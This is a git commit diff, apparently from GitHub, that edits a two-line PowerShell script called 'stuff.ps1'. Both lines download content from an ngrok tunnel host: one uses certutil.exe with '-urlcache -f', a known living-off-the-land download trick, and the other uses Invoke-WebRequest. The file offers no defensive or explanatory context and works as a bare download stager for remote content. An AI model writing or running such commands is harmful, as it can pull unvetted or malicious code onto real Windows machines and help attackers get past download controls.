2ddfa8b539d2b4975608b16f0b265c8a866adbdb
rickthep <109947560+rickthep@users.noreply.github.com>
2024-01-25 00:00:16 -0800

    Update stuff.ps1

--- stuff.ps1
+++ stuff.ps1
@@ -1,2 +1,2 @@
-certutil.exe -urlcache -r https://9528-2001-569-bc84-1f00-11e7-8425-7a48-6521.ngrok-free.app
+certutil.exe -urlcache -f https://9528-2001-569-bc84-1f00-11e7-8425-7a48-6521.ngrok-free.app
 iwr -uri https://9528-2001-569-bc84-1f00-11e7-8425-7a48-6521.ngrok-free.app -usebasicparsing
